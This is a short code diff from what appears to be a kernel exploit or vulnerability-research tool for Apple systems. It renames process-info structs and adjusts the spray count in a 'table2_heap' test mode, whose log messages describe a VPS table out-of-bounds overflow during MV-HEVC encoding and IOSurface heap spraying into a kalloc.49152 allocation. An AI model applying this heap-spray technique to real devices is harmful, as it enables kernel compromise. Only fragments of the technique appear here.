@@ -143,7 +143,7 @@ struct proc_bsdinfo {
     uint64_t pbi_start_tvusec;
 };
 
-struct proc_taskinfo {
+struct my_proc_taskinfo {
     uint64_t pti_virtual_size;
     uint64_t pti_resident_size;
     uint64_t pti_total_user;
@@ -164,9 +164,9 @@ struct proc_taskinfo {
     int32_t  pti_priority;
 };
 
-struct proc_taskallinfo {
+struct my_proc_taskallinfo {
     struct proc_bsdinfo pbsd;
-    struct proc_taskinfo ptinfo;
+    struct my_proc_taskinfo ptinfo;
 };
 
 struct proc_regioninfo {
@@ -25966,9 +25966,8 @@ static void *worker_thread(void *arg) {
             }
 
     } else if (strcmp(mode, "table2_heap") == 0) {
-        #ifndef SPRAY_COUNT
+        #undef SPRAY_COUNT
         #define SPRAY_COUNT 64
-        #endif
         rlog("TABLE2_HEAP: Second VPS table OOB + IOSurface spray test\n");
         rlog("Both VPS tables overflow simultaneously during MV-HEVC encoding.\n");
         rlog("NOTE: Buffer is 0x9B10 bytes in 0xC000 kalloc.49152 allocation.\n");
